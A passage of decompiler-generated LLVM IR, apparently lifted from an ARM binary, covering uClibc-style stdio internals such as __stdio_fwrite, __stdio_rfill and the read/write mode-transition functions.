  %v1_10b88 = load i32, i32* %r1.global-to-local, align 4
  %v2_10b88 = trunc i32 %v1_10b88 to i8
  %v3_10b88 = load i32, i32* @r4, align 4
  %v4_10b88 = inttoptr i32 %v3_10b88 to i8*
  store i8 %v2_10b88, i8* %v4_10b88, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_10b8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10b8c, i32* @r4, align 4
  %v11_10b8c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_10b8c

; uselistorder directives
  uselistorder i32 %v3_10b70, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10b90 = load i32, i32* @r4, align 4
  store i32 %v3_10b90, i32* %stack_var_-20, align 4
  %v6_10b90 = load i32, i32* @r5, align 4
  %v9_10b90 = load i32, i32* @r6, align 4
  %v12_10b90 = load i32, i32* @r7, align 4
  %v15_10b90 = load i32, i32* @lr, align 4
  %v1_10b94 = add i32 %arg3, 1
  %v2_10b94 = inttoptr i32 %v1_10b94 to i8*
  %v3_10b94 = load i8, i8* %v2_10b94, align 1
  %v4_10b94 = zext i8 %v3_10b94 to i32
  %v3_10b98 = mul nuw nsw i32 %v4_10b94, 256
  %v1_10b9c = and i32 %v3_10b98, 512
  store i32 %v1_10b9c, i32* @r4, align 4
  %v2_10b9c = icmp eq i32 %v1_10b9c, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_10b9c, label %dec_label_pc_10bb0, label %dec_label_pc_10cac

dec_label_pc_10bb0:                               ; preds = %entry
  %v1_10bb0 = add i32 %arg3, 4
  %v2_10bb0 = inttoptr i32 %v1_10bb0 to i32*
  %v3_10bb0 = load i32, i32* %v2_10bb0, align 4
  %v1_10bb8 = add i32 %arg3, 16
  %v2_10bb8 = inttoptr i32 %v1_10bb8 to i32*
  %v3_10bb8 = load i32, i32* %v2_10bb8, align 4
  store i32 %v3_10bb8, i32* @r0, align 4
  %v1_10bbc = add i32 %arg3, 12
  %v2_10bbc = inttoptr i32 %v1_10bbc to i32*
  %v3_10bbc = load i32, i32* %v2_10bbc, align 4
  %v4_10bc0 = icmp eq i32 %v3_10bb0, -2
  %v2_10bc4 = sub i32 %v3_10bbc, %v3_10bb8
  br i1 %v4_10bc0, label %dec_label_pc_10bc4, label %dec_label_pc_10bec

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10bb0
  %v3_10bc8 = icmp ugt i32 %v2_10bc4, %arg2
  br i1 %v3_10bc8, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_10bc4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_10bc4, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_10bc4, %dec_label_pc_10bc4 ]
  %v0_10bd0 = phi i32 [ %arg2, %bb ], [ %v2_10bc4, %dec_label_pc_10bc4 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_10bd0, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_10bd8 = call i32 @memcpy()
  %v0_10bdc = load i32, i32* @r5, align 4
  %v1_10bdc = add i32 %v0_10bdc, 16
  %v2_10bdc = inttoptr i32 %v1_10bdc to i32*
  %v3_10bdc = load i32, i32* %v2_10bdc, align 4
  %v1_10be0 = load i32, i32* @r4, align 4
  %v2_10be0 = add i32 %v1_10be0, %v3_10bdc
  store i32 %v2_10be0, i32* %v2_10bdc, align 4
  br label %dec_label_pc_10cc0

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10bb0
  %tmp = icmp ult i32 %v2_10bc4, %arg2
  br i1 %tmp, label %dec_label_pc_10c8c, label %dec_label_pc_10bf8

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10bec
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_10c00 = call i32 @memcpy()
  %v0_10c04 = load i32, i32* @r5, align 4
  %v1_10c04 = add i32 %v0_10c04, 16
  %v2_10c04 = inttoptr i32 %v1_10c04 to i32*
  %v3_10c04 = load i32, i32* %v2_10c04, align 4
  %v1_10c08 = add i32 %v0_10c04, 1
  %v2_10c08 = inttoptr i32 %v1_10c08 to i8*
  %v3_10c08 = load i8, i8* %v2_10c08, align 1
  %v1_10c0c = load i32, i32* @r6, align 4
  %v2_10c0c = add i32 %v1_10c0c, %v3_10c04
  %tmp17 = urem i8 %v3_10c08, 2
  %v2_10c10 = icmp eq i8 %tmp17, 0
  store i32 %v2_10c0c, i32* %v2_10c04, align 4
  br i1 %v2_10c10, label %dec_label_pc_10cc0, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10bf8
  %v0_10c1c = load i32, i32* %r7.global-to-local, align 4
  %v0_10c24 = load i32, i32* @r6, align 4
  %v4_10c28 = call i32 @memrchr(i32 %v0_10c1c, i32 10, i32 %v0_10c24, i32 %v2_10c0c)
  %v2_10c2c = icmp eq i32 %v4_10c28, 0
  br i1 %v2_10c2c, label %dec_label_pc_10cc0, label %dec_label_pc_10c34

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10c1c
  %v0_10c34 = load i32, i32* @r5, align 4
  store i32 %v0_10c34, i32* @r0, align 4
  %v0_10c38 = call i32 @__stdio_wcommit()
  %v2_10c3c = icmp eq i32 %v0_10c38, 0
  br i1 %v2_10c3c, label %dec_label_pc_10cc0, label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c34
  %v0_10c44 = load i32, i32* @r6, align 4
  %v3_10c44 = icmp uge i32 %v0_10c44, %v0_10c38
  %v0_10c38.v0_10c44 = select i1 %v3_10c44, i32 %v0_10c38, i32 %v0_10c44
  store i32 %v0_10c38.v0_10c44, i32* @r4, align 4
  %v2_10c50 = sub i32 %v0_10c44, %v0_10c38.v0_10c44
  %v0_10c54 = load i32, i32* %r7.global-to-local, align 4
  %v2_10c54 = add i32 %v0_10c54, %v2_10c50
  store i32 %v2_10c54, i32* %r7.global-to-local, align 4
  store i32 %v0_10c38.v0_10c44, i32* @r2, align 4
  %v4_10c64 = call i32 @__GI_memchr(i32 %v2_10c54, i32 10, i32 %v0_10c38.v0_10c44, i32 %v2_10c50)
  %v2_10c68 = icmp eq i32 %v4_10c64, 0
  br i1 %v2_10c68, label %dec_label_pc_10cc0, label %dec_label_pc_10c70

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c44
  %v0_10c70 = load i32, i32* @r5, align 4
  %v1_10c70 = add i32 %v0_10c70, 16
  %v2_10c70 = inttoptr i32 %v1_10c70 to i32*
  %v3_10c70 = load i32, i32* %v2_10c70, align 4
  %v0_10c74 = load i32, i32* %r7.global-to-local, align 4
  %v1_10c74 = load i32, i32* @r4, align 4
  %v2_10c74 = sub i32 %v0_10c74, %v4_10c64
  %v2_10c78 = add i32 %v2_10c74, %v1_10c74
  %v2_10c7c = sub i32 %v3_10c70, %v2_10c78
  %v1_10c80 = load i32, i32* @r6, align 4
  %v2_10c80 = sub i32 %v1_10c80, %v2_10c78
  store i32 %v2_10c80, i32* @r6, align 4
  store i32 %v2_10c7c, i32* %v2_10c70, align 4
  br label %dec_label_pc_10cc0

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_10bec
  %v1_10c8c = add i32 %arg3, 8
  %v2_10c8c = inttoptr i32 %v1_10c8c to i32*
  %v3_10c8c = load i32, i32* %v2_10c8c, align 4
  %v9_10c90 = icmp eq i32 %v3_10bb8, %v3_10c8c
  br i1 %v9_10c90, label %dec_label_pc_10cac, label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c8c
  store i32 %arg3, i32* @r0, align 4
  %v0_10c9c = call i32 @__stdio_wcommit()
  %v2_10ca0 = icmp eq i32 %v0_10c9c, 0
  br i1 %v2_10ca0, label %dec_label_pc_10c98.dec_label_pc_10cac_crit_edge, label %bb13

dec_label_pc_10c98.dec_label_pc_10cac_crit_edge:  ; preds = %dec_label_pc_10c98
  %v0_10cb4.pre = load i32, i32* @r6, align 4
  %v0_10cac.pre = load i32, i32* @r5, align 4
  %v0_10cb0.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_10cb8.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_10cac

bb13:                                             ; preds = %dec_label_pc_10c98
  %v1_10ca4 = load i32, i32* @r4, align 4
  store i32 %v1_10ca4, i32* @r6, align 4
  br label %dec_label_pc_10cc0

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10c98.dec_label_pc_10cac_crit_edge, %entry, %dec_label_pc_10c8c
  %v2_10cb8 = phi i32 [ %v2_10cb8.pre, %dec_label_pc_10c98.dec_label_pc_10cac_crit_edge ], [ %v3_10b90, %entry ], [ %v3_10b90, %dec_label_pc_10c8c ]
  %v0_10cb0 = phi i32 [ %v0_10cb0.pre, %dec_label_pc_10c98.dec_label_pc_10cac_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_10c8c ]
  %v0_10cac = phi i32 [ %v0_10cac.pre, %dec_label_pc_10c98.dec_label_pc_10cac_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_10c8c ]
  %v0_10cb4 = phi i32 [ %v0_10cb4.pre, %dec_label_pc_10c98.dec_label_pc_10cac_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_10c8c ]
  store i32 %v2_10cb8, i32* @r4, align 4
  store i32 %v9_10b90, i32* @r6, align 4
  store i32 %v15_10b90, i32* @lr, align 4
  %v3_10cbc = inttoptr i32 %v0_10cac to i8*
  %v4_10cbc = call i32 @__stdio_WRITE(i8* %v3_10cbc, i32 %v0_10cb0, i32 %v0_10cb4)
  br label %dec_label_pc_10cc0

dec_label_pc_10cc0:                               ; preds = %bb13, %dec_label_pc_10c44, %dec_label_pc_10c34, %dec_label_pc_10c1c, %dec_label_pc_10bf8, %dec_label_pc_10c70, %bb10, %dec_label_pc_10cac
  %v0_10cc0 = load i32, i32* @r6, align 4
  %v2_10cc4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10cc4, i32* @r4, align 4
  store i32 %v6_10b90, i32* @r5, align 4
  store i32 %v9_10b90, i32* @r6, align 4
  store i32 %v12_10b90, i32* @r7, align 4
  ret i32 %v0_10cc0

; uselistorder directives
  uselistorder i32 %v2_10c78, { 1, 0 }
  uselistorder i32 %v2_10c50, { 1, 0 }
  uselistorder i32 %v0_10c38.v0_10c44, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10c44, { 1, 0, 2 }
  uselistorder i32 %v2_10bc4, { 2, 0, 1, 3 }
  uselistorder i32 %v9_10b90, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 ()* @memcpy, { 16, 15, 11, 10, 14, 13, 2, 4, 12, 9, 8, 17, 7, 6, 1, 0, 5, 3 }
  uselistorder i32 %arg3, { 0, 1, 6, 3, 8, 7, 5, 2, 4 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_10cc0, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_10cac, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10cc8 = load i32, i32* @r4, align 4
  store i32 %v3_10cc8, i32* %stack_var_-8, align 4
  %v1_10ccc = add i32 %arg1, 8
  %v1_10cd0 = inttoptr i32 %v1_10ccc to i32*
  %v2_10cd0 = load i32, i32* %v1_10cd0, align 4
  store i32 %v2_10cd0, i32* @r1, align 4
  %v3_10cd0 = add i32 %arg1, 12
  %v4_10cd0 = inttoptr i32 %v3_10cd0 to i32*
  %v5_10cd0 = load i32, i32* %v4_10cd0, align 4
  %v2_10cd4 = sub i32 %v5_10cd0, %v2_10cd0
  store i32 %v2_10cd4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_10cdc = inttoptr i32 %arg1 to i8*
  %v4_10cdc = call i32 @__stdio_READ(i8* %v3_10cdc, i32 %v2_10cd0, i32 %v2_10cd4)
  %v0_10ce0 = load i32, i32* @r4, align 4
  %v1_10ce0 = add i32 %v0_10ce0, 8
  %v2_10ce0 = inttoptr i32 %v1_10ce0 to i32*
  %v3_10ce0 = load i32, i32* %v2_10ce0, align 4
  store i32 %v3_10ce0, i32* %r2.global-to-local, align 4
  %v2_10ce4 = add i32 %v3_10ce0, %v4_10cdc
  %v2_10ce8 = add i32 %v0_10ce0, 20
  %v3_10ce8 = inttoptr i32 %v2_10ce8 to i32*
  store i32 %v2_10ce4, i32* %v3_10ce8, align 4
  %v0_10cec = load i32, i32* %r2.global-to-local, align 4
  %v1_10cec = load i32, i32* @r4, align 4
  %v2_10cec = add i32 %v1_10cec, 16
  %v3_10cec = inttoptr i32 %v2_10cec to i32*
  store i32 %v0_10cec, i32* %v3_10cec, align 4
  %v2_10cf0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10cf0, i32* @r4, align 4
  ret i32 %v4_10cdc

; uselistorder directives
  uselistorder i32 %v4_10cdc, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10cf4 = load i32, i32* @r4, align 4
  store i32 %v3_10cf4, i32* %stack_var_-12, align 4
  %v0_10cf8 = load i32, i32* @r0, align 4
  %v1_10cf8 = inttoptr i32 %v0_10cf8 to i8*
  %v2_10cf8 = load i8, i8* %v1_10cf8, align 1
  %v3_10cf8 = zext i8 %v2_10cf8 to i32
  store i32 %v3_10cf8, i32* %r2.global-to-local, align 4
  %v1_10cfc = add i32 %v0_10cf8, 1
  %v2_10cfc = inttoptr i32 %v1_10cfc to i8*
  %v3_10cfc = load i8, i8* %v2_10cfc, align 1
  %v4_10cfc = zext i8 %v3_10cfc to i32
  store i32 %v4_10cfc, i32* %r3.global-to-local, align 4
  %v4_10d00 = mul nuw nsw i32 %v4_10cfc, 256
  %v5_10d00 = or i32 %v4_10d00, %v3_10cf8
  store i32 %v5_10d00, i32* %r2.global-to-local, align 4
  %v1_10d04 = load i32, i32* @r1, align 4
  %v2_10d04 = and i32 %v1_10d04, %v5_10d00
  %v4_10d04 = icmp eq i32 %v2_10d04, 0
  store i32 %v0_10cf8, i32* @r4, align 4
  br i1 %v4_10d04, label %dec_label_pc_10d10, label %dec_label_pc_10d28

dec_label_pc_10d10:                               ; preds = %entry
  %v1_10d10 = and i32 %v5_10d00, 2176
  %v2_10d10 = icmp eq i32 %v1_10d10, 0
  br i1 %v2_10d10, label %dec_label_pc_10d18, label %dec_label_pc_10d3c

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10d10
  %v2_10d18 = or i32 %v1_10d04, %v5_10d00
  store i32 %v2_10d18, i32* %r2.global-to-local, align 4
  %v3_10d1c = sdiv i32 %v2_10d18, 256
  store i32 %v3_10d1c, i32* %r3.global-to-local, align 4
  %v1_10d20 = trunc i32 %v3_10d1c to i8
  store i8 %v1_10d20, i8* %v2_10cfc, align 1
  %v0_10d24 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d24 = trunc i32 %v0_10d24 to i8
  %v2_10d24 = load i32, i32* @r0, align 4
  %v3_10d24 = inttoptr i32 %v2_10d24 to i8*
  store i8 %v1_10d24, i8* %v3_10d24, align 1
  %v0_10d28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %entry, %dec_label_pc_10d18
  %v0_10d28 = phi i32 [ %v0_10cf8, %entry ], [ %v0_10d28.pre, %dec_label_pc_10d18 ]
  %v1_10d28 = inttoptr i32 %v0_10d28 to i8*
  %v2_10d28 = load i8, i8* %v1_10d28, align 1
  %v3_10d28 = zext i8 %v2_10d28 to i32
  store i32 %v3_10d28, i32* %r2.global-to-local, align 4
  %v1_10d2c = add i32 %v0_10d28, 1
  %v2_10d2c = inttoptr i32 %v1_10d2c to i8*
  %v3_10d2c = load i8, i8* %v2_10d2c, align 1
  %v4_10d2c = zext i8 %v3_10d2c to i32
  %v4_10d30 = mul nuw nsw i32 %v4_10d2c, 256
  %v5_10d30 = or i32 %v4_10d30, %v3_10d28
  store i32 %v5_10d30, i32* %r3.global-to-local, align 4
  %v1_10d34 = and i32 %v3_10d28, 16
  store i32 %v1_10d34, i32* %r5.global-to-local, align 4
  %v2_10d34 = icmp eq i32 %v1_10d34, 0
  br i1 %v2_10d34, label %dec_label_pc_10d64, label %dec_label_pc_10d3c

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d10, %dec_label_pc_10d28
  %v0_10d3c = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_10d44 = inttoptr i32 %v0_10d3c to i32*
  store i32 9, i32* %v2_10d44, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d6c, %dec_label_pc_10d3c
  %v0_10d48 = load i32, i32* @r4, align 4
  %v1_10d48 = inttoptr i32 %v0_10d48 to i32*
  %v2_10d48 = load i32, i32* %v1_10d48, align 4
  %v1_10d4c = or i32 %v2_10d48, 8
  store i32 %v1_10d4c, i32* %r3.global-to-local, align 4
  %v3_10d50 = sdiv i32 %v2_10d48, 256
  store i32 %v3_10d50, i32* %r2.global-to-local, align 4
  %v1_10d58 = trunc i32 %v3_10d50 to i8
  %v3_10d58 = add i32 %v0_10d48, 1
  %v4_10d58 = inttoptr i32 %v3_10d58 to i8*
  store i8 %v1_10d58, i8* %v4_10d58, align 1
  %v0_10d5c = load i32, i32* %r3.global-to-local, align 4
  %v1_10d5c = trunc i32 %v0_10d5c to i8
  %v2_10d5c = load i32, i32* @r4, align 4
  %v3_10d5c = inttoptr i32 %v2_10d5c to i8*
  store i8 %v1_10d5c, i8* %v3_10d5c, align 1
  %v2_10d60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10d60, i32* @r4, align 4
  ret i32 -1

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d28
  %v1_10d64 = and i32 %v3_10d28, 64
  %v2_10d64 = icmp eq i32 %v1_10d64, 0
  br i1 %v2_10d64, label %dec_label_pc_10d94, label %dec_label_pc_10d6c

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d64
  %v0_10d6c = call i32 @__stdio_wcommit()
  %v2_10d70 = icmp eq i32 %v0_10d6c, 0
  br i1 %v2_10d70, label %dec_label_pc_10d78, label %dec_label_pc_10d48

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d6c
  %v0_10d78 = load i32, i32* @r4, align 4
  %v1_10d78 = inttoptr i32 %v0_10d78 to i32*
  %v2_10d78 = load i32, i32* %v1_10d78, align 4
  store i32 %v2_10d78, i32* %r3.global-to-local, align 4
  %v1_10d7c = add i32 %v0_10d78, 8
  %v2_10d7c = inttoptr i32 %v1_10d7c to i32*
  %v3_10d7c = load i32, i32* %v2_10d7c, align 4
  store i32 %v3_10d7c, i32* %r2.global-to-local, align 4
  %v1_10d80 = and i32 %v2_10d78, -65
  store i32 %v1_10d80, i32* %r3.global-to-local, align 4
  %v3_10d84 = sdiv i32 %v2_10d78, 256
  store i32 %v3_10d84, i32* %r1.global-to-local, align 4
  %v2_10d88 = add i32 %v0_10d78, 28
  %v3_10d88 = inttoptr i32 %v2_10d88 to i32*
  store i32 %v3_10d7c, i32* %v3_10d88, align 4
  %v0_10d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_10d8c = trunc i32 %v0_10d8c to i8
  %v2_10d8c = load i32, i32* @r4, align 4
  %v3_10d8c = add i32 %v2_10d8c, 1
  %v4_10d8c = inttoptr i32 %v3_10d8c to i8*
  store i8 %v1_10d8c, i8* %v4_10d8c, align 1
  %v0_10d90 = load i32, i32* %r3.global-to-local, align 4
  %v1_10d90 = trunc i32 %v0_10d90 to i8
  %v2_10d90 = load i32, i32* @r4, align 4
  %v3_10d90 = inttoptr i32 %v2_10d90 to i8*
  store i8 %v1_10d90, i8* %v3_10d90, align 1
  %v0_10d94.pre = load i32, i32* @r4, align 4
  %v0_10da0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10d94

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d64, %dec_label_pc_10d78
  %v0_10da0 = phi i32 [ 0, %dec_label_pc_10d64 ], [ %v0_10da0.pre, %dec_label_pc_10d78 ]
  %v2_10da4 = phi i32 [ %v0_10d28, %dec_label_pc_10d64 ], [ %v0_10d94.pre, %dec_label_pc_10d78 ]
  %v1_10d94 = inttoptr i32 %v2_10da4 to i32*
  %v2_10d94 = load i32, i32* %v1_10d94, align 4
  %v1_10d98 = or i32 %v2_10d94, 1
  store i32 %v1_10d98, i32* %r3.global-to-local, align 4
  %v3_10d9c = sdiv i32 %v2_10d94, 256
  store i32 %v3_10d9c, i32* %r2.global-to-local, align 4
  %v1_10da4 = trunc i32 %v3_10d9c to i8
  %v3_10da4 = add i32 %v2_10da4, 1
  %v4_10da4 = inttoptr i32 %v3_10da4 to i8*
  store i8 %v1_10da4, i8* %v4_10da4, align 1
  %v0_10da8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10da8 = trunc i32 %v0_10da8 to i8
  %v2_10da8 = load i32, i32* @r4, align 4
  %v3_10da8 = inttoptr i32 %v2_10da8 to i8*
  store i8 %v1_10da8, i8* %v3_10da8, align 1
  %v2_10dac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10dac, i32* @r4, align 4
  ret i32 %v0_10da0

; uselistorder directives
  uselistorder i32 %v3_10d9c, { 1, 0 }
  uselistorder i32 %v3_10d50, { 1, 0 }
  uselistorder i32 %v3_10d28, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10d28, { 0, 2, 1 }
  uselistorder i32 %v3_10d1c, { 1, 0 }
  uselistorder i32 %v5_10d00, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10d94, { 1, 0 }
  uselistorder label %dec_label_pc_10d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10d28, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10db0 = load i32, i32* @r4, align 4
  store i32 %v3_10db0, i32* %stack_var_-8, align 4
  %v3_10db4 = load i8, i8* %arg1, align 1
  %v4_10db4 = zext i8 %v3_10db4 to i32
  store i32 %v4_10db4, i32* %r2.global-to-local, align 4
  %v2_10db8 = add i32 %tmp, 1
  %v3_10db8 = inttoptr i32 %v2_10db8 to i8*
  %v4_10db8 = load i8, i8* %v3_10db8, align 1
  %v5_10db8 = zext i8 %v4_10db8 to i32
  store i32 %v5_10db8, i32* %r3.global-to-local, align 4
  %v4_10dbc = mul nuw nsw i32 %v5_10db8, 256
  %v5_10dbc = or i32 %v4_10dbc, %v4_10db4
  store i32 %v5_10dbc, i32* %r2.global-to-local, align 4
  %v2_10dc0 = and i32 %v5_10dbc, %arg2
  %v4_10dc0 = icmp eq i32 %v2_10dc0, 0
  store i1 %v4_10dc0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_10dc0, label %dec_label_pc_10dcc, label %dec_label_pc_10de4

dec_label_pc_10dcc:                               ; preds = %entry
  %v1_10dcc = and i32 %v5_10dbc, 2176
  %v2_10dcc = icmp eq i32 %v1_10dcc, 0
  store i1 %v2_10dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10dcc, label %dec_label_pc_10dd4, label %dec_label_pc_10df8

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10dcc
  %v2_10dd4 = or i32 %v5_10dbc, %arg2
  store i32 %v2_10dd4, i32* %r2.global-to-local, align 4
  %v3_10dd8 = sdiv i32 %v2_10dd4, 256
  store i32 %v3_10dd8, i32* %r3.global-to-local, align 4
  %v1_10ddc = trunc i32 %v3_10dd8 to i8
  store i8 %v1_10ddc, i8* %v3_10db8, align 1
  %v0_10de0 = load i32, i32* %r2.global-to-local, align 4
  %v1_10de0 = trunc i32 %v0_10de0 to i8
  store i8 %v1_10de0, i8* %arg1, align 1
  %v0_10de4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10de4

dec_label_pc_10de4:                               ; preds = %entry, %dec_label_pc_10dd4
  %v0_10e30 = phi i32 [ %tmp, %entry ], [ %v0_10de4.pre, %dec_label_pc_10dd4 ]
  %v1_10de4 = inttoptr i32 %v0_10e30 to i8*
  %v2_10de4 = load i8, i8* %v1_10de4, align 1
  %v3_10de4 = zext i8 %v2_10de4 to i32
  store i32 %v3_10de4, i32* %r2.global-to-local, align 4
  %v1_10de8 = add i32 %v0_10e30, 1
  %v2_10de8 = inttoptr i32 %v1_10de8 to i8*
  %v3_10de8 = load i8, i8* %v2_10de8, align 1
  %v4_10de8 = zext i8 %v3_10de8 to i32
  store i32 %v4_10de8, i32* %r3.global-to-local, align 4
  %v4_10dec = mul nuw nsw i32 %v4_10de8, 256
  %v1_10df0 = and i32 %v3_10de4, 32
  %v2_10df0 = icmp eq i32 %v1_10df0, 0
  store i1 %v2_10df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10df0, label %dec_label_pc_10e20, label %dec_label_pc_10df8

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10dcc, %dec_label_pc_10de4
  %v0_10df8 = call i32 @__errno_location()
  store i32 %v0_10df8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_10e00 = inttoptr i32 %v0_10df8 to i32*
  store i32 9, i32* %v2_10e00, align 4
  br label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10e48, %dec_label_pc_10df8
  %v0_10e04 = load i32, i32* @r4, align 4
  %v1_10e04 = inttoptr i32 %v0_10e04 to i32*
  %v2_10e04 = load i32, i32* %v1_10e04, align 4
  %v1_10e08 = or i32 %v2_10e04, 8
  store i32 %v1_10e08, i32* %r3.global-to-local, align 4
  %v3_10e0c = sdiv i32 %v2_10e04, 256
  store i32 %v3_10e0c, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10e14 = trunc i32 %v3_10e0c to i8
  %v3_10e14 = add i32 %v0_10e04, 1
  %v4_10e14 = inttoptr i32 %v3_10e14 to i8*
  store i8 %v1_10e14, i8* %v4_10e14, align 1
  %v0_10e18 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e18 = trunc i32 %v0_10e18 to i8
  %v2_10e18 = load i32, i32* @r4, align 4
  %v3_10e18 = inttoptr i32 %v2_10e18 to i8*
  store i8 %v1_10e18, i8* %v3_10e18, align 1
  %v2_10e1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10e1c, i32* @r4, align 4
  ret i32 -1

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10de4
  %tmp15 = urem i8 %v2_10de4, 4
  %v2_10e20 = icmp eq i8 %tmp15, 0
  store i1 %v2_10e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e20, label %dec_label_pc_10e84, label %dec_label_pc_10e28

dec_label_pc_10e28:                               ; preds = %dec_label_pc_10e20
  %v1_10e28 = and i32 %v3_10de4, 4
  store i32 %v1_10e28, i32* @r1, align 4
  %v2_10e28 = icmp eq i32 %v1_10e28, 0
  store i1 %v2_10e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e28, label %dec_label_pc_10e30, label %dec_label_pc_10e60

dec_label_pc_10e30:                               ; preds = %dec_label_pc_10e28
  %v1_10e30 = add i32 %v0_10e30, 20
  %v2_10e30 = inttoptr i32 %v1_10e30 to i32*
  %v3_10e30 = load i32, i32* %v2_10e30, align 4
  store i32 %v3_10e30, i32* %r2.global-to-local, align 4
  %v1_10e34 = add i32 %v0_10e30, 16
  %v2_10e34 = inttoptr i32 %v1_10e34 to i32*
  %v3_10e34 = load i32, i32* %v2_10e34, align 4
  store i32 %v3_10e34, i32* %r3.global-to-local, align 4
  %v9_10e38 = icmp eq i32 %v3_10e30, %v3_10e34
  store i1 %v9_10e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10e38, label %dec_label_pc_10e40, label %dec_label_pc_10e48

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e30
